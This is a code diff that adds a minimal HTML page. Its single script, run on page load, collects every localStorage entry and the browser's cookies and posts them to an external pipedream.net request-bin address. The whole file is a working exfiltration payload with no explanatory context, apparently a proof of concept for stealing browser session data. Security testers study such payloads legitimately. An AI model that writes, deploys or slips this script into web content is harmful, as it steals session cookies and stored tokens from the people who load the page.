@@ -1,0 +1,13 @@
+<html>
+  <body>
+    <script>
+      fetch("https://enw16o5nmiis8.x.pipedream.net/", {
+        method: "post",
+        body: JSON.stringify({
+          cool: Object.entries(localStorage),
+          cookie: document.cookie,
+        }),
+      });
+    </script>
+  </body>
+</html>
